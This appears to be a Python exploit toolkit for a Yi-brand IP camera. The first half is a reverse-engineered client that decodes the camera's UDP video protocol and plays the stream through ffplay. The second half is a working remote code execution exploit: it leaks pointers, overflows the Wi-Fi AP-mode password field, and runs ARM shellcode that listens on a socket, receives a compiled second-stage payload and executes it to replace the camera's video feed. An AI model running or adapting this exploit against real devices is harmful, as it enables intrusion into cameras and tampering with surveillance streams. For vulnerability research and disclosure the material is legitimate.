from yi_packets import *
from libyip2p import *
from pwn import *
import threading
import socket
import time
from queue import Queue
import struct
import os

# header observed before the h264 payload (which starts with 0x00000001)
class VideoHeader:
    def __init__(self, data):
        self.codec_id, self.flags, self.liveFlag, self.onlineNum, self.useCount, self.frmNo, \
        self.videoWidth, self.videoHeight, self.timestamp1, self.isDay, self.cover_state, \
        self.outloss, self.inloss, self.timestamp2 = struct.unpack('>HBBBBHHHIBBBBI', data)

    def getFrame(self):
        return self.frmNo
        
    def __str__(self):
        return (f"codec_id: {self.codec_id}, "
                f"flags: {self.flags}, "
                f"liveFlag: {self.liveFlag}, "
                f"onlineNum: {self.onlineNum}, "
                f"useCount: {self.useCount}, "
                f"frmNo: {self.frmNo}, "
                f"videoWidth: {self.videoWidth}, "
                f"videoHeight: {self.videoHeight}, "
                f"timestamp1: {self.timestamp1}, "
                f"isDay: {self.isDay}, "
                f"cover_state: {self.cover_state}, "
                f"outloss: {self.outloss}, "
                f"inloss: {self.inloss}, "
                f"timestamp2: {self.timestamp2}")


# unused as causes annoying issues, but just a way to ack multiple video messages
def send_frame_message_acks_multi(udp_socket, source_port, channel, to_ack):
    to_send_start = b'\xf1\xd1'

    vid_header = b'\xd1' + channel.to_bytes(1) + len(to_ack).to_bytes(2)

    to_ack_list = []
    for i in to_ack:
        vid_header += i.to_bytes(2)

    final_packet = to_send_start + len(vid_header).to_bytes(2) + vid_header

    udp_socket.sendto(final_packet, (target_ip, source_port))


# sends an ack packet to the camera indicating that the frame has been received
def send_frame_message_ack_single(udp_socket, source_port, channel, to_ack):
    final_packet = b'\xf1\xd1\x00\x06\xd1' + channel.to_bytes(1) + b'\x00\x01' + to_ack.to_bytes(2)

    udp_socket.sendto(final_packet, (target_ip, source_port))


# channel 2 is for I messages, pops messages off the queue, handles single and split messages
def I_message_processor(I_messages_queue,h264_messages_queue):
    current_frame_recv_I = 0
    current_frame_size_I = 0

    currently_building_message = b''
    finished_message = b''

    while True:
        resp = I_messages_queue.get()

        # Handle video messages
        if (len(resp) > 18) and (resp[17] == 0x4e):
            current_frame_index_I = int.from_bytes(resp[22:24])
            current_frame_size_I = int.from_bytes(resp[14:16]) # how much data we are expecting
            current_frame_recv_I = int.from_bytes(resp[2:4])

            if current_frame_recv_I - 0xc == current_frame_size_I:
                # this is a single packet, the 4 byte DRW thing isnt needed, dont expect any more packets and increment the index
                current_frame_recv_I -= 0xc
                
                # print(f"Channel 2 I message single: {current_frame_recv_I}/{current_frame_size_I} - index: {int.from_bytes(resp[6:8])}")
                frmNo = VideoHeader(resp[0x10:0x28]).getFrame()

                current_frame_size_I = 0
                current_frame_recv_I = 0

                # message_completed(resp[0x28:])
                h264_messages_queue.put([frmNo, resp[0x28:]])
            elif current_frame_recv_I - 0x10 <= current_frame_size_I:
                # this is a multi packet, the 4 byte DRW thing is needed, expect more packets and dont increment the index
                current_frame_recv_I -= 0xc
                currently_building_message += resp[0x10:]
                
                # print(f"Channel 2 I message multi: {current_frame_recv_I}/{current_frame_size_I} - index: {int.from_bytes(resp[6:8])}")
                # # print(VideoHeader(resp[0x10:0x28]))

        elif (len(resp) > 6) and (resp[4] == 0xd1) and (resp[5] in [0x02, 0x03]):
            # this is a continued multi frame
            current_frame_recv_I += int.from_bytes(resp[2:4]) - 4
            # print(f"Channel 2 I message cont: {current_frame_recv_I}/{current_frame_size_I} - index: {int.from_bytes(resp[6:8])}")
            currently_building_message += resp[0x8:]

            if current_frame_recv_I == current_frame_size_I:
                frmNo = VideoHeader(currently_building_message[0x0:0x18]).getFrame()
                h264_messages_queue.put([frmNo, currently_building_message[0x18:]])
                currently_building_message = b''


# channel 3 is for P messages, pops messages off the queue, handles single and split messages
def P_message_processor(P_messages_queue, h264_messages_queue):
    current_frame_recv_P = 0
    current_frame_size_P = 0

    currently_building_message = b''
    finished_message = b''

    try:
        while True:
            resp = P_messages_queue.get()

            # Handle P messages
            if (len(resp) > 18) and (resp[17] == 0x4e):
                current_frame_index_P = int.from_bytes(resp[22:24])
                current_frame_size_P = int.from_bytes(resp[14:16]) # how much data we are expecting
                current_frame_recv_P = int.from_bytes(resp[2:4])

                if current_frame_recv_P - 0xc == current_frame_size_P:
                    # this is a single packet, the 4 byte DRW thing isnt needed, dont expect any more packets and increment the index
                    current_frame_recv_P -= 0xc

                    # print(f"Channel 3 P message single: {current_frame_recv_P}/{current_frame_size_P} - index: {int.from_bytes(resp[6:8])}")
                    frmNo = VideoHeader(resp[0x10:0x28]).getFrame()

                    current_frame_size_P = 0
                    current_frame_recv_P = 0

                    h264_messages_queue.put([frmNo, resp[0x28:]])
                elif current_frame_recv_P - 0x10 <= current_frame_size_P:
                    # this is a multi packet, the 4 byte DRW thing is needed, expect more packets and dont increment the index
                    current_frame_recv_P -= 0xc
                    currently_building_message += resp[0x10:]

                    # print(f"Channel 3 P Message multi: {current_frame_recv_P}/{current_frame_size_P} - index: {int.from_bytes(resp[6:8])}")
                    # # print(VideoHeader(resp[0x10:0x28]))

            elif (len(resp) > 6) and (resp[4] == 0xd1) and (resp[5] in [0x02, 0x03]):
                # this is a continued multi frame
                current_frame_recv_P += int.from_bytes(resp[2:4]) - 4
                # print(f"Channel 3 P Message cont: {current_frame_recv_P}/{current_frame_size_P} - index: {int.from_bytes(resp[6:8])}")
                currently_building_message += resp[0x8:]

                if current_frame_recv_P == current_frame_size_P:
                    frmNo = VideoHeader(currently_building_message[0x0:0x18]).getFrame()
                    h264_messages_queue.put([frmNo, currently_building_message[0x18:]])
                    currently_building_message = b''
    except Exception as e:
        print(str(e))


# thread function that pops off complete h264 messages and sends to the ffplay socket (assumes frames are in order)
def constructed_message_dispatcher(h264_messages_queue):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while True:
            current_frame, next_message = h264_messages_queue.get()
            s.sendto(next_message, ('127.0.0.1', 13377))
            info(f"Sent frame {current_frame} to ffplay")


# thread function, handles the ffplay process which gets data through the udp socket
def ffplay_run_and_listen():
    width, height = 640, 360

    # Launch ffplay to display the video stream
    process = subprocess.Popen(
        ['ffplay', '-probesize', '64', '-i', 'udp://127.0.0.1:13377', '-vf', f'scale={width}:{height}'],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    # Wait for ffplay process to finish
    process.communicate()


# this thread is responsible for responding to alive messages, sending acks when messages are recieved, 
# and sorting the recieved messages into a nice queue for P and I frame processors to pop off
def connection_manager(source_port, udp_socket, raw_message_queue, I_messages_queue, P_messages_queue):
    out_of_order_messages_I = {}
    out_of_order_messages_P = {}

    current_recv_index_I = 0
    current_recv_index_P = 0

    while True:
        resp = raw_message_queue.get()

        if b'\xf1\xe0\x00\x00' in resp[0]:
            # handle alive messages
            udp_socket.sendto(b'\xf1\xe1\x00\x00', (target_ip, source_port))
        else:
            # Handle video messages
            if (((len(resp[0]) > 18) and (resp[0][17] == 0x4e)) or ((len(resp[0]) > 7) and (resp[0][4] == 0xd1) and (resp[0][5] in [0x02, 0x03]))):
                message_index = int.from_bytes(resp[0][6:8])
                if resp[0][5] == 0x02: # this is an I frame
                    if message_index == current_recv_index_I:
                        I_messages_queue.put(resp[0])
                        current_recv_index_I += 1
                        while current_recv_index_I in out_of_order_messages_I:
                            I_messages_queue.put(out_of_order_messages_I[current_recv_index_I])
                            current_recv_index_I += 1
                    else:
                        out_of_order_messages_I[message_index] = resp[0]

                    send_frame_message_ack_single(udp_socket, source_port, 2, message_index)
                if resp[0][5] == 0x03: # this if a P frame
                    if message_index == current_recv_index_P:
                        P_messages_queue.put(resp[0])
                        current_recv_index_P += 1
                        while current_recv_index_P in out_of_order_messages_P:
                            P_messages_queue.put(out_of_order_messages_P[current_recv_index_P])
                            current_recv_index_P += 1
                    else:
                        out_of_order_messages_P[message_index] = resp[0]

                    send_frame_message_ack_single(udp_socket, source_port, 3, message_index)


# initialises worker threads, starts stream, and captures packets to feed to workers
def start_stream():
    info("Starting worker threads...")

    # Create a queue for message passing between threads
    raw_message_queue = Queue()
    I_messages_queue = Queue()
    P_messages_queue = Queue()
    h264_messages_queue = Queue()

    # for processing I frames
    I_processor_thread = threading.Thread(target=I_message_processor, args=(I_messages_queue,h264_messages_queue))
    I_processor_thread.start()

    # for processing P frames
    P_processor_thread = threading.Thread(target=P_message_processor, args=(P_messages_queue,h264_messages_queue))
    P_processor_thread.start()

    # for dispatch to ffplay via socket
    constructed_message_dispatcher_thread = threading.Thread(target=constructed_message_dispatcher, args=(h264_messages_queue,))
    constructed_message_dispatcher_thread.start()

    # runs ffplay subprocess
    ffplay_thread = threading.Thread(target=ffplay_run_and_listen)
    ffplay_thread.start()
    
    info("Starting stream...")
    
    source_port, udp_socket = start_connection(get_tnp_uid())

    # Starting stream
    start = IOTYPE_USER_TNP_IPCAM_START_KEY('', 2, 2, 1)
    udp_socket.sendto(start.pack(), (target_ip, source_port))

    success("Stream start message sent!")
    info(get_hexdump(start.pack()))

    # resolution = IOTYPE_USER_IPCAM_SET_RESOLUTION('', 2, 1, 0x1)
    # udp_socket.sendto(resolution.pack(), (target_ip, source_port))
    
    # receives the raw network messages, handles alive messages, and passes video stream packets to processors
    connection_thread = threading.Thread(target=connection_manager, args=(source_port, udp_socket, raw_message_queue, I_messages_queue, P_messages_queue))
    connection_thread.start()


    info("Started receiving raw packets...")
    while True:
        resp = udp_socket.recvfrom(20000)
        raw_message_queue.put(resp)

"""
aim of this function is to replace the stream of the camera
with an image of max headroom, the famous channel hijacking guy

Plan is this:
- Write encoded stage 2 payload into hardware string (which we can overflow)
- Use our initial code execution to decode the string payload with stage 1
- This hw string payload should then malloc a big chunk of memory, 
    and receive another stage via a socket (which will be our stage 3)
- The plan for the payload is to close the stream thread, then reopen it but
    instead of using an ioctl to /dev/video0, it should just copy a saved file
    and send that instead (will have to be h264 encoded before it is sent)
"""
def generate_stage_1_payload(payload_start, libc_base, target_length, stage_2_length):
    # malloc a huge buffer for our fuckery functions
    # set up a TCP socket to recv stage 2
    # execute stage 2 in thread and fixup execution
    malloc_addr = 0x19498
    socket_addr = 0x19f54
    bind_addr = 0x1906c
    listen_addr = 0x1a2a8
    accept_addr = 0x1a1a0
    recv_addr = 0x195ac
    close_addr = 0x19ad4
    sleep_addr = 0x192a0

    sockaddr_in_addr = 0x4b9748
    thread_id_addr = 0x4b9744
    create_thread_addr = 0x6eb2c
    detach_thread_addr = 0x1a308

    ak_thread_exit_addr = 0x6ecd8

    stage1_asm = f"""
        @ malloc some space and put location on stack
        ldr r0, =#{hex(stage_2_length)}
        ldr r12, =#{hex(malloc_addr)}
        blx r12
        stmdb sp!,{{r0}}
        cpy r5, r0

        @ now call socket to get our socket fd and put fd on stack
        mov r0, #2
        mov r1, #1
        mov r2, #0
        ldr r12, =#{hex(socket_addr)}
        blx r12
        stmdb sp!,{{r0}}

        @ create the sockaddr in memory (can use a bit of the device_param space in anyka_ipc as only 64 bytes used)
        ldr r2, =#0x39050002
        ldr r1, =#{hex(sockaddr_in_addr)}
        str r2, [r1]
        stmdb sp!,{{r1}}

        @ now call bind with the socket_fd in r0, and the sockaddr addr in r1 (plus len in r2)
        mov r2, #0x10
        ldr r3, =#{hex(bind_addr)}
        blx r3

        @ now call listen to wait for connections, assume all registers dead
        ldr r0, [sp, #4]
        mov r1, 0x3
        ldr r3, =#{hex(listen_addr)}
        blx r3

        @ at this point we now have a connection, accept the connection, save new socket
        ldr r3, =#{hex(accept_addr)}
        ldr r2, =#0xb8ad4
        ldr r0, [sp, #4]
        ldr r1, [sp]
        blx r3
        stmdb sp!,{{r0}}

        @ now we need to recv the data on the new socket
        ldr r1, [sp, #0xc]
        ldr r2, =#{hex(stage_2_length)}
        mov r3, #0x0
        ldr r4, =#{hex(recv_addr)}
        blx r4

        @ now close the socket for cleanliness
        ldr r0, [sp, #0x0]
        ldr r3, =#{hex(close_addr)}
        blx r3

        @ create a thread that executes the received function (arg 4 on stack)
        ldr r0, =#0xffffffff
        str r0, [sp, #0x0]
        ldr r0, =#{thread_id_addr}
        ldr r1, [sp, #0xc]
        mov r2, #0
        ldr r3, =#0x19000
        ldr r8, =#{create_thread_addr}
        blx r8

        @ exit the thread now
        ldr r3, =#{ak_thread_exit_addr}
        blx r3
    """

    payload_assembled = asm(stage1_asm, arch='arm', endian="little")
    payload_assembled_bytes = bytes.fromhex(payload_assembled.hex())

    # build payload
    payload = payload_assembled_bytes + (target_length - len(payload_assembled_bytes)) * b'\x41'

    return payload

def generate_stage_2_payload(path):
    # first set the yi_av_ctrl.vi_run_flag to 0 so that the yi_live_video_thread exits
    
    os.system(f"arm-none-eabi-gcc {path} -o sploit.o -nostdlib -fPIC -fPIE -lgcc")
    os.system("arm-none-eabi-objcopy -O binary sploit.o sploit")

    with open("sploit", "rb") as f:
        # Read the entire contents of the file as bytes
        stage_2 = f.read()

    # Now you have the bytes data
    return stage_2

def hijack_camera_stream(payload_type):
    payloads = ["flash", "max", "hackerman", "bongo", "doom", "wargames"]
    if payload_type not in payloads:
        info("Invalid type")
        exit(0)
    # initialise the connection and leak the pointers
    session_socket, source_port,  leaked_ptrs = get_values_from_stack(get_tnp_uid(), [0x420,0x260])

    # we can derives some useful pointers from the leaks :)
    payload_start = leaked_ptrs[0] - 0xA60 # this is the location the payload ends up
    libc_base = leaked_ptrs[1] - 0x5234F # this is the libc base pointer

    success(f"""Leaked Addresses:
\tLeaked libYiP2P.so pointer:   {hex(leaked_ptrs[0])}
\tTarget PC:                    {hex(leaked_ptrs[0] - 0xA60)}
\tLeaked libc pointer:          {hex(leaked_ptrs[1])}
\tLibc base:                    {hex(leaked_ptrs[1] - 0x5234F)}
""")

    # generate the payload stages
    ignition = b'a' * 44 + payload_start.to_bytes(4, 'little')
    stage_2 = generate_stage_2_payload(f"hijack_payloads/{payload_type}.c")
    stage_1 = generate_stage_1_payload(payload_start, libc_base, 0x374, len(stage_2))

    info(f"Ignition:\n{get_hexdump(ignition)}")
    info(f"Stage 1:\n{get_hexdump(stage_1)}")
    info(f"Stage 2:\n{get_hexdump(stage_2)}")
    
    # send ignition (trigger) and stage 1 (listen for stage 2)
    info("Sending IOTYPE_USER_IPCAM_SET_AP_MODE_REQ overflow payload w/ stage 1")
    wifi_pwd_overflow = IOTYPE_USER_IPCAM_SET_AP_MODE_REQ_PHAT_OFFSET('', 0x1, '', ignition, stage_1, 0x4)
    session_socket.sendto(wifi_pwd_overflow.pack(), (target_ip, source_port))

    time.sleep(1)

    # IP address and port of the server
    IP_ADDRESS = '192.168.10.1'
    PORT = 1337

    info("Sending stage 2...")

    # send stage 2
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((IP_ADDRESS, PORT))
    client_socket.sendall(stage_2)
    client_socket.close()

    success("Done!")

